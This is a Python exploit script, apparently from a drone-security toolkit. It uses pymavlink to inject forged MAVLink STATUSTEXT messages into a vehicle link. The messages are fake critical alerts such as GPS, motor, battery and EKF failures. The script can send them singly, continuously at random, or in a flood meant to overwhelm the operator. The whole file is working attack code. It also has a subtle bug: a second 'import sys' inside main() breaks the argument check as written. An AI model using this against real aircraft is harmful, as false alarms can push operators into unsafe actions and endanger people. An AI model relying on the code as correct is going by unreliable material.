#!/usr/bin/env python3
"""
Critical Error Spoofing Exploit Script
Injects false error messages via STATUSTEXT to trigger false error handling
"""

import sys
import time
from pymavlink import mavutil

# Common error messages to spoof
ERROR_MESSAGES = [
    "EKF CHECK FAIL",
    "GPS GLITCH",
    "COMPASS FAIL",
    "BARO FAIL",
    "BATTERY CRITICAL",
    "MOTOR FAIL",
    "SENSOR FAILURE",
    "SYSTEM OVERLOAD",
    "COMMUNICATION LOST",
    "AUTOPILOT ERROR",
]

def inject_error_message(connection, error_text, severity=None):
    """
    Inject false error message via STATUSTEXT
    
    Args:
        connection: MAVLink connection object
        error_text: Error message text
        severity: Severity level (MAV_SEVERITY_*)
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    if severity is None:
        severity = mavutil.mavlink.MAV_SEVERITY_CRITICAL
    
    # STATUSTEXT message has max 50 characters
    if len(error_text) > 50:
        error_text = error_text[:50]
    
    print(f"[*] Injecting error message: {error_text}")
    print(f"    Severity: {severity}")
    
    # Send STATUSTEXT message
    # STATUSTEXT uses 50-byte text field
    text_bytes = error_text.encode('utf-8')[:50]
    text_padded = text_bytes + b'\x00' * (50 - len(text_bytes))
    
    connection.mav.statustext_send(
        severity,
        text_padded
    )
    
    print("[+] Error message injected")

def inject_random_error(connection):
    """Inject a random error message"""
    import random
    error = random.choice(ERROR_MESSAGES)
    inject_error_message(connection, error)

def flood_error_messages(connection, count=10):
    """Flood with error messages to overwhelm operator"""
    print(f"[*] Flooding with {count} error messages...")
    for i in range(count):
        inject_random_error(connection)
        time.sleep(0.1)

def trigger_specific_error(connection, error_type):
    """Trigger a specific type of error"""
    error_map = {
        'ekf': 'EKF CHECK FAIL',
        'gps': 'GPS GLITCH',
        'compass': 'COMPASS FAIL',
        'baro': 'BARO FAIL',
        'battery': 'BATTERY CRITICAL',
        'motor': 'MOTOR FAIL',
        'sensor': 'SENSOR FAILURE',
        'overload': 'SYSTEM OVERLOAD',
        'comm': 'COMMUNICATION LOST',
        'autopilot': 'AUTOPILOT ERROR',
    }
    
    error_text = error_map.get(error_type.lower(), error_type)
    inject_error_message(connection, error_text)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 critical_error_spoofing.py <connection> [error_text|error_type|action]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  error_text    Custom error message text")
        print("  error_type    Predefined error type: ekf, gps, compass, baro, battery, motor, sensor, overload, comm, autopilot")
        print("  action        Action to perform:")
        print("                random       Inject random errors continuously")
        print("                flood        Flood with multiple error messages")
        print("\nExamples:")
        print("  python3 critical_error_spoofing.py udp:127.0.0.1:14550 'CUSTOM ERROR MESSAGE'")
        print("  python3 critical_error_spoofing.py udp:127.0.0.1:14550 gps")
        print("  python3 critical_error_spoofing.py udp:127.0.0.1:14550 random")
        print("  python3 critical_error_spoofing.py udp:127.0.0.1:14550 flood")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    arg = sys.argv[2] if len(sys.argv) > 2 else 'random'
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Perform action
    if arg == 'random':
        print("[*] Injecting random errors (Press Ctrl+C to stop)...")
        try:
            while True:
                inject_random_error(connection)
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[*] Stopping error injection...")
    elif arg == 'flood':
        flood_error_messages(connection)
    elif arg.lower() in ['ekf', 'gps', 'compass', 'baro', 'battery', 'motor', 'sensor', 'overload', 'comm', 'autopilot']:
        trigger_specific_error(connection, arg)
    else:
        # Custom error message
        inject_error_message(connection, arg)

if __name__ == "__main__":
    main()
